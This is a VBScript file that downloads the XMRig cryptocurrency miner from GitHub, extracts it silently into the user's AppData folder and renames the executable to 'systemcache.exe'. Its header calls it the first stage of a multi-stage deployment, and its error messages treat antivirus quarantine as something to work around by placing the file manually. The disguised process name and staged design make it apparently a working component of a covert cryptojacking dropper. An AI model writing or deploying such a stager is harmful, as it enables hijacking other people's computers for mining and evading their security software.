'====================================================================================
' File: DownloadAndExtractMiner.vbs
' Description: Downloads the XMRig ZIP and extracts it to the designated miner folder.
'              Then immediately renames the extracted xmrig.exe to systemcache.exe.
'              Designed as the first stage of a multi-stage deployment.
'              Handles download failures by prompting for manual placement.
'              IMPORTANT: All folders and files created by this script will be fully visible.
'              Output is sent directly to the console (no pop-ups).
'              Verification for extracted file is immediate (1-second timeout).
'====================================================================================

' --- Configuration ---
Dim WshShell, fso
On Error Resume Next ' Enable error handling for object creation
Set WshShell = CreateObject("WScript.Shell")
If Err.Number <> 0 Or Not IsObject(WshShell) Then
    WScript.StdOut.WriteLine "CRITICAL ERROR: Failed to create WScript.Shell object. This may indicate a system issue or security software interference. Error: " & Err.Description
    WScript.Quit 1
End If
Err.Clear

Set fso = CreateObject("Scripting.FileSystemObject")
If Err.Number <> 0 Or Not IsObject(fso) Then
    WScript.StdOut.WriteLine "CRITICAL ERROR: Failed to create Scripting.FileSystemObject object ('fso'). This is required for file operations. Error: " & Err.Description
    WScript.Quit 1
End If
Err.Clear
On Error GoTo 0 ' Disable error handling for general script flow

' Miner folder in %APPDATA%
Dim appDataPath
appDataPath = WshShell.SpecialFolders("AppData")
Dim minerFolder
minerFolder = appDataPath & "\XMRigMiner" ' Fully visible folder name

' Miner details (for paths)
Dim xmrigDownloadUrl, expectedExeSubFolderName
xmrigDownloadUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
' *** CRITICAL PATH FIX: This MUST match the folder name you observed inside the ZIP after extraction ***
expectedExeSubFolderName = "xmrig-6.21.0"

' --- NEW: Define the final desired executable name ---
Const FINAL_MINER_EXE_NAME = "systemcache.exe" ' Changed from ssyetmcashce.exe

' Derived paths for clarity
Dim finalMinerExePath, minerWorkingDirectory
Dim isFlatExtraction ' Flag to track if xmrig.exe is extracted directly or in a subfolder

' --- Script Logic ---
WScript.StdOut.WriteLine "--- Miner Download & Extraction Script ---"
WScript.StdOut.WriteLine "Current time: " & Now()

' 1. Create the main miner folder in the user's AppData directory
WScript.StdOut.WriteLine "Target miner folder: " & minerFolder
If Not FolderExists(minerFolder) Then
    WScript.StdOut.WriteLine "Miner folder does not exist. Attempting to create: " & minerFolder
    CreateFolder minerFolder
Else
    WScript.StdOut.WriteLine "Miner folder already exists: " & minerFolder
End If

' Setup paths based on expected subfolder structure initially
' The final path for the *renamed* executable
finalMinerExePath = minerFolder & "\" & expectedExeSubFolderName & "\" & FINAL_MINER_EXE_NAME
minerWorkingDirectory = minerFolder & "\" & expectedExeSubFolderName

' 2. Clean up old temporary extraction files and ZIP
Dim tempExtractFolder, downloadZipPath
tempExtractFolder = minerFolder & "\temp_xmrig_extract"
downloadZipPath = minerFolder & "\xmrig_download.zip"

WScript.StdOut.WriteLine "Performing cleanup of old temp files..."
DeleteFolder tempExtractFolder
DeleteFile downloadZipPath

' 3. Download XMRig ZIP or use pre-existing one
If Not FileExists(finalMinerExePath) Then ' Check for the *final* named executable
    WScript.StdOut.WriteLine "Final miner executable ('" & FINAL_MINER_EXE_NAME & "') not found. Proceeding with download and extraction."
    WScript.StdOut.WriteLine "Attempting to download XMRig from: " & xmrigDownloadUrl & " to " & downloadZipPath

    DownloadFile xmrigDownloadUrl, downloadZipPath
    
    If Not FileExists(downloadZipPath) Then
        WScript.StdOut.WriteLine "ERROR: Downloaded ZIP file does not exist at expected path after download attempt." & vbCrLf & _
                                 "This indicates a network block (firewall, proxy, security software) or Antivirus quarantine." & vbCrLf & _
                                 "ACTION REQUIRED: Please manually download the ZIP file from " & xmrigDownloadUrl & vbCrLf & _
                                 "and place it as " & downloadZipPath & vbCrLf & _
                                 "Then run this script again."
        WScript.Quit 1
    End If
    
    ' 4. Extract the ZIP
    WScript.StdOut.WriteLine "Extracting XMRig from: " & downloadZipPath & " to " & tempExtractFolder
    ' Pass expected subfolder for verification during extraction
    ExpandZip downloadZipPath, tempExtractFolder, expectedExeSubFolderName 

    ' After extraction, re-evaluate if it was a flat extraction (if xmrig.exe is directly in tempExtractFolder)
    Dim extractedXmrigOriginalPath ' Path to xmrig.exe *after* extraction, *before* rename
    If Not FolderExists(tempExtractFolder & "\" & expectedExeSubFolderName) And FileExists(tempExtractFolder & "\xmrig.exe") Then
        isFlatExtraction = True
        extractedXmrigOriginalPath = tempExtractFolder & "\xmrig.exe"
        minerWorkingDirectory = minerFolder ' Update working directory for flat extract
        finalMinerExePath = minerFolder & "\" & FINAL_MINER_EXE_NAME ' Update final path for flat extract
    Else
        isFlatExtraction = False
        extractedXmrigOriginalPath = tempExtractFolder & "\" & expectedExeSubFolderName & "\xmrig.exe"
    End If

    ' --- DEBUGGING CHECKS START HERE ---
    WScript.StdOut.WriteLine "--- Debugging: Post-Extraction Checks ---"
    
    WScript.StdOut.WriteLine "DEBUG: Immediately checking for original xmrig.exe in temp extraction path: " & extractedXmrigOriginalPath
    If FileExists(extractedXmrigOriginalPath) Then
        WScript.StdOut.WriteLine "DEBUG: xmrig.exe FOUND in temp extraction path. File size: " & fso.GetFile(extractedXmrigOriginalPath).Size & " bytes."
    Else
        WScript.StdOut.WriteLine "DEBUG: xmrig.exe NOT FOUND in temp extraction path. This is the immediate post-extraction check."
        WScript.StdOut.WriteLine "CRITICAL ERROR: 'xmrig.exe' was not found at expected temp extraction path. Aborting."
        WScript.Quit 1 ' Exit immediately if not found here.
    End If

    ' 5. Move extracted miner to its final location
    WScript.StdOut.WriteLine "DEBUG: Preparing to move extracted miner to final destination folder: " & fso.GetParentFolderName(finalMinerExePath)
    Dim sourceOfExtractedFiles
    If Not isFlatExtraction Then
        sourceOfExtractedFiles = tempExtractFolder & "\" & expectedExeSubFolderName
        WScript.StdOut.WriteLine "DEBUG: Moving folder from: " & sourceOfExtractedFiles & " to " & minerWorkingDirectory
        MoveFolder sourceOfExtractedFiles, minerWorkingDirectory
    Else ' Flat extraction, move just the xmrig.exe
        sourceOfExtractedFiles = tempExtractFolder & "\xmrig.exe"
        WScript.StdOut.WriteLine "DEBUG: Copying file from: " & sourceOfExtractedFiles & " to " & minerWorkingDirectory & "\xmrig.exe" ' Copy xmrig.exe into final working dir temporarily
    End If

    ' --- NEW: Rename xmrig.exe to systemcache.exe in the final location ---
    Dim tempXmrigInFinalPath
    If Not isFlatExtraction Then ' If it's a subfolder extraction, xmrig.exe should now be in minerWorkingDirectory
        tempXmrigInFinalPath = minerWorkingDirectory & "\xmrig.exe"
    Else ' If it was a flat extraction, xmrig.exe was copied directly into minerFolder
        tempXmrigInFinalPath = minerWorkingDirectory & "\xmrig.exe"
    End If

    WScript.StdOut.WriteLine "Attempting to rename " & tempXmrigInFinalPath & " to " & finalMinerExePath
    If FileExists(tempXmrigInFinalPath) Then
        If Not RenameFile(tempXmrigInFinalPath, FINAL_MINER_EXE_NAME) Then
            WScript.StdOut.WriteLine "CRITICAL ERROR: Failed to rename '" & tempXmrigInFinalPath & "' to '" & FINAL_MINER_EXE_NAME & "'. Aborting."
            WScript.Quit 1
        End If
        WScript.StdOut.WriteLine "Successfully renamed miner executable to: " & finalMinerExePath
    Else
        WScript.StdOut.WriteLine "CRITICAL ERROR: 'xmrig.exe' not found in final location for renaming: " & tempXmrigInFinalPath & ". Aborting."
        WScript.Quit 1
    End If
    ' --- END NEW RENAME ---

    WScript.StdOut.WriteLine "DEBUG: Immediately checking for " & FINAL_MINER_EXE_NAME & " in final path after rename: " & finalMinerExePath
    If FileExists(finalMinerExePath) Then
        WScript.StdOut.WriteLine "DEBUG: " & FINAL_MINER_EXE_NAME & " FOUND in final location. File size: " & fso.GetFile(finalMinerExePath).Size & " bytes."
    Else
        WScript.StdOut.WriteLine "DEBUG: " & FINAL_MINER_EXE_NAME & " NOT FOUND in final location after rename. Aborting."
        WScript.Quit 1 ' Exit immediately if not found here.
    End If
    ' --- DEBUGGING CHECKS END HERE ---

    WScript.StdOut.WriteLine "Cleaning up temporary extraction folder and downloaded zip..."
    DeleteFolder tempExtractFolder
    DeleteFile downloadZipPath
Else
    WScript.StdOut.WriteLine "Miner executable ('" & FINAL_MINER_EXE_NAME & "') found at: " & finalMinerExePath & ". Skipping download and extraction."
End If

' Final verification - this should now pass if the above DEBUG checks pass
If Not FileExists(finalMinerExePath) Then
    WScript.StdOut.WriteLine "CRITICAL ERROR: Final miner executable was not found at " & finalMinerExePath & " after all setup attempts. Aborting."
    WScript.Quit 1
End If

WScript.StdOut.WriteLine "Miner executable successfully prepared at: " & finalMinerExePath
WScript.StdOut.WriteLine "You can now proceed to the next stage (configuration and starting)."
WScript.StdOut.WriteLine "--- Download & Extraction Script Finished ---"

' --- Function Definitions ---

Function FolderExists(folderPath)
    On Error Resume Next
    FolderExists = fso.FolderExists(folderPath)
    If Err.Number <> 0 Then FolderExists = False
    Err.Clear
    On Error GoTo 0
End Function

Sub CreateFolder(folderPath)
    If FolderExists(folderPath) Then Exit Sub

    Dim parentFolder
    parentFolder = fso.GetParentFolderName(folderPath)

    If parentFolder <> "" And Not FolderExists(parentFolder) Then
        CreateFolder parentFolder
    End If

    On Error Resume Next
    fso.CreateFolder(folderPath)
    If Err.Number <> 0 Then
        WScript.StdOut.WriteLine "ERROR: Failed to create folder " & folderPath & ". Error: " & Err.Description
        WScript.Quit 1
    End If
    Err.Clear
    On Error GoTo 0
End Sub

Function FileExists(filePath)
    On Error Resume Next
    FileExists = fso.FileExists(filePath)
    If Err.Number <> 0 Then FileExists = False
    Err.Clear
    On Error GoTo 0
End Function

Sub DownloadFile(url, savePath)
    On Error Resume Next
    Dim objXMLHTTP, objStream
    Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    If Err.Number <> 0 Or Not IsObject(objXMLHTTP) Then
        WScript.StdOut.WriteLine "DOWNLOAD ERROR: Failed to create MSXML2.ServerXMLHTTP.6.0 object. " & Err.Description
        WScript.Quit 1
    End If
    Err.Clear
    
    objXMLHTTP.open "GET", url, False
    objXMLHTTP.send

    If Err.Number <> 0 Then
        WScript.StdOut.WriteLine "DOWNLOAD ERROR (VBScript COM): " & Err.Description & " (Error Number: " & Err.Number & ")"
        WScript.Quit 1
    End If

    If objXMLHTTP.status = 200 Then
        Set objStream = CreateObject("ADODB.Stream")
        If Err.Number <> 0 Or Not IsObject(objStream) Then
            WScript.StdOut.WriteLine "DOWNLOAD ERROR: Failed to create ADODB.Stream object. " & Err.Description
            WScript.Quit 1
        End If
        Err.Clear
        objStream.Type = 1
        objStream.Open
        objStream.Write objXMLHTTP.responseBody
        objStream.SaveToFile savePath, 2
        objStream.Close
        WScript.StdOut.WriteLine "Successfully downloaded " & url & " to " & savePath
    Else
        WScript.StdOut.WriteLine "DOWNLOAD FAILED (HTTP Status): " & objXMLHTTP.status & " (" & objXMLHTTP.statusText & ")"
        WScript.Quit 1
    End If
    Set objStream = Nothing
    Set objXMLHTTP = Nothing
    Err.Clear
    On Error GoTo 0
End Sub

Sub ExpandZip(zipPath, destinationPath, expectedSubfolder)
    If Not FolderExists(destinationPath) Then CreateFolder destinationPath

    Dim objShell, objSource, objTarget
    Set objShell = CreateObject("Shell.Application")
    If Err.Number <> 0 Or Not IsObject(objShell) Then
        WScript.StdOut.WriteLine "EXTRACTION ERROR: Failed to create Shell.Application object. " & Err.Description
        WScript.Quit 1
    End If
    Err.Clear

    If FileExists(zipPath) Then
        Set objSource = objShell.NameSpace(zipPath)
        If Err.Number <> 0 Or Not IsObject(objSource) Then
            WScript.StdOut.WriteLine "EXTRACTION ERROR: Failed to access ZIP file namespace (" & zipPath & "). " & Err.Description
            WScript.Quit 1
        End If
        Err.Clear

        Set objTarget = objShell.NameSpace(destinationPath)
        If Err.Number <> 0 Or Not IsObject(objTarget) Then
            WScript.StdOut.WriteLine "EXTRACTION ERROR: Failed to access destination folder namespace (" & destinationPath & "). " & Err.Description
            WScript.Quit 1
            End If
        Err.Clear

        On Error Resume Next
        objTarget.CopyHere objSource.Items, 16 ' Suppresses progress dialog

        If Err.Number <> 0 Then
            WScript.StdOut.WriteLine "EXTRACTION ERROR (CopyHere): " & Err.Description & " (Error Number: " & Err.Number & ")"
            WScript.Quit 1
        End If
        Err.Clear
        On Error GoTo 0

        WScript.StdOut.WriteLine "Waiting for extraction to complete and verifying 'xmrig.exe' existence (1-second timeout)..."
        Dim maxWaitSeconds, currentWaitTime, extractionComplete
        maxWaitSeconds = 1 ' Reduced timeout to 1 second for faster feedback
        currentWaitTime = 0
        extractionComplete = False

        Do While Not extractionComplete And currentWaitTime < maxWaitSeconds
            WScript.Sleep 1000 ' Wait 1 second
            currentWaitTime = currentWaitTime + 1

            Dim localFSO ' Use a local FSO for verification
            Set localFSO = CreateObject("Scripting.FileSystemObject")
            If Not IsObject(localFSO) Then
                 WScript.StdOut.WriteLine "WARNING: Could not create local FSO for extraction verification. Skipping detailed check."
                 Exit Do
            End If
            
            On Error Resume Next
            ' Explicitly log the exact paths being checked
            WScript.StdOut.WriteLine "DEBUG (ExpandZip Loop): Attempting to verify: " & destinationPath & "\" & expectedSubfolder & "\xmrig.exe"
            If localFSO.FolderExists(destinationPath & "\" & expectedSubfolder) Then
                If localFSO.FileExists(destinationPath & "\" & expectedSubfolder & "\xmrig.exe") Then
                    extractionComplete = True
                End If
            ElseIf localFSO.FileExists(destinationPath & "\xmrig.exe") Then ' Fallback for flat extraction
                WScript.StdOut.WriteLine "DEBUG (ExpandZip Loop): Also checking for flat extraction at: " & destinationPath & "\xmrig.exe"
                extractionComplete = True
            End If
            Err.Clear
            On Error GoTo 0
            Set localFSO = Nothing
        Loop

        If Not extractionComplete Then
            WScript.StdOut.WriteLine "EXTRACTION ERROR: 'xmrig.exe' not found after " & maxWaitSeconds & " second(s). This likely means Antivirus/security software removed it during extraction or the expected path is still incorrect."
            WScript.Quit 1
        End If
        WScript.StdOut.WriteLine "ZIP file extracted successfully and verified."
    Else
        WScript.StdOut.WriteLine "ERROR: ZIP file not found at " & zipPath & ". Cannot extract."
        WScript.Quit 1
    End If
    Set objSource = Nothing
    Set objTarget = Nothing
    Set objShell = Nothing
    Err.Clear
    On Error GoTo 0
End Sub

Sub DeleteFile(filePath)
    On Error Resume Next
    If FileExists(filePath) Then fso.DeleteFile(filePath)
    Err.Clear
    On Error GoTo 0
End Sub

Sub DeleteFolder(folderPath)
    On Error Resume Next
    If fso.FolderExists(folderPath) Then fso.DeleteFolder folderPath, True
    Err.Clear
    On Error GoTo 0
End Sub

Sub MoveFolder(sourceFolder, destinationFolder)
    On Error Resume Next
    If fso.FolderExists(sourceFolder) Then
        If fso.FolderExists(destinationFolder) Then DeleteFolder destinationFolder
        If fso.FileExists(destinationFolder) Then DeleteFile destinationFolder
        
        fso.MoveFolder sourceFolder, destinationFolder
        If Err.Number <> 0 Then
            WScript.StdOut.WriteLine "ERROR: Failed to move folder " & sourceFolder & " to " & destinationFolder & ": " & Err.Description
            WScript.Quit 1
        End If
    Else
        WScript.StdOut.WriteLine "ERROR: Source folder not found for move operation: " & sourceFolder & ". Cannot move."
        WScript.Quit 1
    End If
    Err.Clear
    On Error GoTo 0
End Sub

Sub CopyFile(sourcePath, destinationPath)
    On Error Resume Next
    If FileExists(sourcePath) Then
        Dim destFolder
        destFolder = fso.GetParentFolderName(destinationPath)
        If Not fso.FolderExists(destFolder) Then CreateFolder destFolder
        
        If FileExists(destinationPath) Then DeleteFile destinationPath

        fso.CopyFile sourcePath, destinationPath, True
        If Err.Number <> 0 Then
            WScript.StdOut.WriteLine "ERROR: Failed to copy " & sourcePath & " to " & destinationPath & ": " & Err.Description
            WScript.Quit 1
        End If
    Else
        WScript.StdOut.WriteLine "ERROR: Source file not found for copy operation: " & sourcePath & ". Cannot copy."
        WScript.Quit 1
    End If
    Err.Clear
    On Error GoTo 0
End Sub

' --- NEW: RenameFile Function ---
Function RenameFile(oldPath, newFileName)
    WScript.StdOut.WriteLine "LOG: Attempting to rename '" & oldPath & "' to '" & newFileName & "'"
    On Error Resume Next
    Dim parentFolder : parentFolder = fso.GetParentFolderName(oldPath)
    Dim newPath : newPath = parentFolder & "\" & newFileName

    If Not fso.FileExists(oldPath) Then
        WScript.StdOut.WriteLine "ERROR: Source file for rename not found: " & oldPath
        RenameFile = False
        Exit Function
    End If

    If fso.FileExists(newPath) Then
        WScript.StdOut.WriteLine "LOG: Deleting existing target file '" & newPath & "' before rename."
        fso.DeleteFile newPath, True
        If Err.Number <> 0 Then
            WScript.StdOut.WriteLine "ERROR: Failed to delete existing target file for rename: " & Err.Description
            RenameFile = False
            Exit Function
        End If
    End If

    fso.MoveFile oldPath, newPath
    If Err.Number <> 0 Then
        WScript.StdOut.WriteLine "ERROR: Failed to rename '" & oldPath & "' to '" & newPath & "'. Error: " & Err.Description
        RenameFile = False
    Else
        WScript.StdOut.WriteLine "LOG: File renamed successfully to '" & newPath & "'."
        RenameFile = True
    End If
    Err.Clear
    On Error GoTo 0
End Function